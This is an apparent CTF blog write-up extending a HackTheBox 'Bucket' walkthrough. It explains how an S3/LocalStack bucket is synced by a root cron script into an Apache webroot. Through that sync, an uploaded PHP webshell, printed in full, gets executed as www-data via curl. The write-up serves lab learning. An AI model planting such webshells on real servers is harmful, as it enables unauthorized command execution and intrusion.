# More Bucket Beyond Root

[ctf](/tags#ctf ) [htb-bucket](/tags#htb-bucket )
[hackthebox](/tags#hackthebox ) [s3](/tags#s3 ) [aws](/tags#aws )
[awscli](/tags#awscli ) [apache](/tags#apache ) [docker](/tags#docker )
[localstack](/tags#localstack ) [cron](/tags#cron )
[automation](/tags#automation )  
  
May 3, 2021

  * [HTB: Bucket](/2021/04/24/htb-bucket.html)
  * More Beyond Root

![cascade](https://0xdfimages.gitlab.io/img/bucket-more-cover.png)

@teh_zeron reach out on twitter to ask why there’s no images directory in the
webroot on Bucket. I showed how my PHP webshell will show up there, and the
index page seems to always be there. I’ll look closely at how Bucket was set
up, how different requests are handled, and the automation that is syncing
between the host and the container.

## Requests Routing

To look at this, I’ll start with what I know about Bucket, it’s listening
ports, and it’s containers:

![](https://0xdfimages.gitlab.io/img/bucket-layout.png)

Requests to bucket.htb (and really anything ending in bucket.htb that isn’t
s3.bucket.htb) will be served out of `/var/www/html` on Bucket. Requests to
s3.bucket.htb as passed with the `ProxyPass` directive in the
`/etc/apache2/site-enabled/000-default.conf` file:

    
    
            ProxyPass / http://localhost:4566/
            ProxyPassReverse / http://localhost:4566/
    

`docker ps` shows that port 4566 on localhost is being forwarded to 4566 on
the localstack container:

    
    
    root@bucket:~# docker ps
    CONTAINER ID        IMAGE                          COMMAND                  CREATED             STATUS              PORTS                                               NAMES
    444af250749d        localstack/localstack:latest   "docker-entrypoint.sh"   7 months ago        Up 30 minutes       4567-4597/tcp, 127.0.0.1:4566->4566/tcp, 8080/tcp   localstack
    

This is how far I went in the original [Beyond Root](/2021/04/24/htb-
bucket.html#beyond-root) section (without the nice picture).

## Requests

### Background

I’ll look at a few requests and how they are handled.

When I tried to visit the page by IP in Firefox, it redirected me to
`bucket.htb` (that’s also in the `000-default.conf` file). `http://bucket.htb`
is simply served from `/var/www/html/index.html`.

Within that page, there were images, with sources like
`http://s3.bucket.htb/adserver/images/bug.jpg`. Referencing the image above,
when this request is made, it’s forwarded to the localstack container, which
returns the image.

I also noted that `http://s3.bucket.htb/adserver/index.html` loaded what
looked like the `index.html` page. This doesn’t have to be the case, but isn’t
surprising. Perhaps the site is backing up the `index.html` page in the cloud.

### Upload

With that in mind, I uploaded a PHP shell using the `aws` command line
utility:

    
    
    oxdf@parrot$ aws s3 --endpoint-url http://s3.bucket.htb cp /opt/shells/php/cmd.php s3://adserver/
    upload: ../../../../opt/shells/php/cmd.php to s3://adserver/cmd.php
    

Immediately after doing that, there’s no `cmd.php` on `bucket.htb`, but there
is one in the S3 bucket:

    
    
    oxdf@parrot$ curl http://bucket.htb/cmd.php?cmd=id
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>Apache/2.4.41 (Ubuntu) Server at bucket.htb Port 80</address>
    </body></html>
    oxdf@parrot$ curl http://s3.bucket.htb/adserver/cmd.php?cmd=id
    <?php system($_REQUEST["cmd"]); ?>
    

But the webshell isn’t executed from s3. That makes sense, as it’s meant to be
static storage, not hosting a full featured site.

If I wait for the minute to roll and check again, now the webshell is there
and executing:

    
    
    oxdf@parrot$ curl http://bucket.htb/cmd.php?cmd=id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

## Sync

### sync.sh

The webshell makes it from the localstack container to the host when an
automation script runs on Bucket.

As root, there are three crons:

    
    
    root@bucket:~# crontab -l
    ...[snip]...
    # m h  dom mon dow   command
    @reboot /root/start.sh
    * * * * *       /root/sync.sh
    * * * * *       rm /var/www/bucket-app/files/*
    

The first runs on boot, and starts the containers. The third is related to the
application running on localhost, bucket-app (used in the privesc).

`/root/sync.sh` is important here:

    
    
    #!/bin/bash
    
    rm -rf /root/files/*
    aws --endpoint-url=http://localhost:4566 s3 sync s3://adserver/ /root/files/ --exclude "*.png" --exclude "*.jpg"
    cp -R /root/files/* /var/www/html/
    

It clears the files in a local directory in `/root`. It then syncs everything
from s3 excluding images over to a new clean folder. Then it copies everything
from that folder into `/var/www/html`. I had noted that the files in
`/var/www/html` were owned by root, yet somehow written by www-data. This
explains that.

### images

So my guess at this point is that the `images` directory isn’t copies because
none of the files in it are synced. I can verify that. I’ll run the `aws sync`
command without the excludes.

    
    
    root@bucket:~# aws --endpoint-url=http://localhost:4566 s3 sync s3://adserver/ /tmp/.0xdf/
    download: s3://adserver/images/bug.jpg to ../tmp/.0xdf/images/bug.jpg
    download: s3://adserver/index.html to ../tmp/.0xdf/index.html      
    download: s3://adserver/images/malware.png to ../tmp/.0xdf/images/malware.png
    download: s3://adserver/images/cloud.png to ../tmp/.0xdf/images/cloud.png
    

The images directory and everything in it is copied into the target folder.

Or showing it the other way, if I upload a non-`png` and non-`jpg` file to the
images folder and wait for the cron to run, then the `images` folder is copied
into `/var/www/html`:

    
    
    root@bucket:~# find /var/www/html/
    /var/www/html/
    /var/www/html/index.html
    /var/www/html/images
    /var/www/html/images/cmd.php
    

[« HTB: Bucket](/2021/04/24/htb-bucket.html)

[](/2021/05/03/more-bucket-beyond-root.html)

